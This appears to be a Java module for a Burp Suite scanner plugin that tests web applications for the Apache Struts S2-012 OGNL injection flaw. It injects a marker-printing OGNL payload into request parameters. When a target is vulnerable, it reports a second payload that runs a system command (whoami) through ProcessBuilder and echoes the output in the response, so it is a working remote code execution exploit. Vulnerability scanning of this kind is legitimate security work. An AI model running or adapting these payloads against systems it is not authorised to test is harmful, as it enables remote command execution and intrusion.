package module;

import burp.*;

import java.net.URLEncoder;
import java.util.List;

public class S2_012 extends IModule {
    public S2_012() {
        poc =
            "%{" +
            "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
            "#f.getWriter().print(\"" + injectMark[0] + "\")," +
            "#f.getWriter().print(\"" + injectMark[1] + "\")," +
            "#f.getWriter().flush()," +
            "#f.getWriter().close()" +
            "}";
        poc = URLEncoder.encode(poc);

        exp =
            "%{" +
            "#a=(new java.lang.ProcessBuilder(\"whoami\")).redirectErrorStream(true).start()," +
            "#b=#a.getInputStream()," +
            "#c=new java.io.InputStreamReader(#b)," +
            "#d=new java.io.BufferedReader(#c)," +
            "#e=new char[50]," +
            "#d.read(#e)," +
            "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
            "#f.getWriter().println(new java.lang.String(#e))," +
            "#f.getWriter().flush()," +
            "#f.getWriter().close()" +
            "}";
        exp = URLEncoder.encode(exp);
    }

    @Override
    public IScanIssue start() {
        byte[] response = iHttpRequestResponse.getResponse();
        IResponseInfo iResponseInfo = helpers.analyzeResponse(response);
        short statusCode = iResponseInfo.getStatusCode();

        if (statusCode == 302) {
            List<IParameter> parameters = requestInfo.getParameters();
            for (IParameter parameter: parameters) {
                if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                    IParameter newParameter = helpers.buildParameter(parameter.getName(), poc, parameter.getType());
                    request = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
                    if (check()) {
                        this.detail = exp;
                        return creatCustomScanIssue();
                    }
                }
            }
        }
        return null;
    }
}
